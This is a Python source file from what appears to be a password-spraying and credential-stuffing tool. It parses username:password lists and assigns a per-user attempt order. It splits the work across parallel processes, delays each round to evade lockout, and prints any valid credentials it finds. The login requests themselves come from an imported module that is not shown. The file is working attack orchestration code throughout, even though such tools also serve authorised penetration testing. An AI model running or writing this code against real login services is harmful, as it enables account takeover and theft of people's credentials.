from collections import defaultdict
from datetime import datetime, timedelta
import pause

def perform_stuffing(spray_config, args):
    from .spray import launch_spray_processes
    results = []

    credentials = split_username_password(args.usernames)
    credentials = assign_spray_identifier(credentials)

    stuffing_attempt = 1
    num_stuffing_attempts = max(d['ATTEMPT'] for d in credentials)

    while stuffing_attempt <= num_stuffing_attempts:
        next_start_time = datetime.now() + timedelta(minutes=args.delay)  # Check when the next spray should run
        print(f"Beginning stuffing attempt {stuffing_attempt} of {num_stuffing_attempts}.")

        user_chunks = split_users_into_chunks(credentials, stuffing_attempt, args.threads)
        results.extend(launch_spray_processes(spray_config, user_chunks))

        # Check to see if the process is at the end. If not, wait the specified time.
        if stuffing_attempt < num_stuffing_attempts:
            print(f"Stuffing attempt {stuffing_attempt} of {num_stuffing_attempts} complete. Waiting until "
                  f"{next_start_time.strftime('%H:%M')} to start next stuffing attempt.")
            if any(entry['RESULT'] == 'SUCCESS' for entry in results):
                print("Valid Credentials Found:")
                for entry in results:
                    if entry['RESULT'] == 'SUCCESS':
                        print(f"{entry['USERNAME']} - {entry['PASSWORD']}")
                print()
            pause.until(next_start_time)

        else:
            print(
                f"Spray of password {stuffing_attempt} of {num_stuffing_attempts} complete. All passwords complete.")
        stuffing_attempt += 1

    return results


def split_username_password(usernames):
    credentials = []
    for credential in usernames:
        username = credential.split(":")[0]
        password = credential.split(":")[1]
        credentials.append({'USERNAME': username, 'PASSWORD': password, 'ATTEMPT': 0})

    return credentials


def assign_spray_identifier(credentials):
    # Assign unique spray identifier
    user_groups = defaultdict(list)
    for d in credentials:
        user_groups[d['USERNAME']].append(d)
    for user, group in user_groups.items():
        for index, d in enumerate(group, start=1):
            d['ATTEMPT'] = index
    credentials = [d for group in user_groups.values() for d in group]
    # At this point, credentials is a list of dicts with three attributes: username, password, attempt

    return credentials


def split_users_into_chunks(credentials, stuffing_attempt, threads):
    credentials_to_spray = []
    for credential in credentials:
        if credential['ATTEMPT'] == stuffing_attempt:
            credentials_to_spray.append(credential)

    chunk_size = (len(credentials_to_spray) + threads - 1) // threads
    user_chunks = [credentials_to_spray[i:i + chunk_size] for i in
                   range(0, len(credentials_to_spray), chunk_size)]
    # user_chunks is a list (with one entry per chunk that will be given to each process) of lists, which contain
    #     dicts that contain username, password, and attempt #.

    return user_chunks

